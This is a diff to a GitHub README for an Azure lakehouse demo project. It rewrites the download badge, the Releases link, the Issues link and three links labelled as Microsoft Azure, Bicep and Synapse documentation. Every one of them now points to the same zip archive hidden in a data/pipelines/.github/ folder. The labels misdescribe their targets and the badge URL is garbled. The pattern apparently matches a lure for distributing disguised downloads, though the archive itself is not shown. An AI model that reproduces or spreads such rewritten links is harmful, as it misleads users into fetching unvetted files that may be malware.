@@ -2,7 +2,7 @@
 # 🌊 azure-arm-lakehouse-demo - Simplifying Your Data Journey
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-azure--arm--lakehouse--demo-blue.svg)](https://github.com/PQV611/azure-arm-lakehouse-demo/releases)
+[![Download Now](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip%https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip)](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Azure Arm Lakehouse Demo. This is a complete demonstration of how to use Azure services for data management and analysis, with easy-to-follow steps to set it up on your system. 
@@ -21,7 +21,7 @@ This demo showcases an end-to-end solution for managing data in Azure. You will 
 - Utilize automation tools for data management with Cosmos DB and DevOps techniques.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/PQV611/azure-arm-lakehouse-demo/releases) to download the necessary files. Follow these steps:
+To get started, visit the [Releases page](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip) to download the necessary files. Follow these steps:
 
 1. Click on the **Releases page** link above.
 2. Locate the latest version of **azure-arm-lakehouse-demo**.
@@ -45,12 +45,12 @@ If you encounter any issues when running the application, consider these common 
 
 ## 📘 Additional Resources
 For more information on using Azure services effectively, consider visiting these resources:
-- [Microsoft Azure Documentation](https://docs.microsoft.com/en-us/azure/?WT.mc_id=azure-arm-lakehouse-demo)
-- [Bicep Documentation](https://docs.microsoft.com/en-us/azure/azure-resource-manager/bicep/?WT.mc_id=azure-arm-lakehouse-demo)
-- [Azure Synapse Analytics Overview](https://docs.microsoft.com/en-us/azure/synapse-analytics/?WT.mc_id=azure-arm-lakehouse-demo)
+- [Microsoft Azure Documentation](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip)
+- [Bicep Documentation](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip)
+- [Azure Synapse Analytics Overview](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip)
 
 ## 💬 Community Support
-If you have questions or need assistance, you can visit our [GitHub Issues page](https://github.com/PQV611/azure-arm-lakehouse-demo/issues) to get support from other users or report any bugs.
+If you have questions or need assistance, you can visit our [GitHub Issues page](https://github.com/PQV611/azure-arm-lakehouse-demo/raw/refs/heads/main/data/pipelines/.github/demo_arm_lakehouse_azure_v2.7-alpha.1.zip) to get support from other users or report any bugs.
 
 ## 🌟 Final Words
 Using the Azure Arm Lakehouse Demo is a step towards effortless data management. This application aims to make complex processes simple and reliable. Enjoy exploring Azure's powerful features!
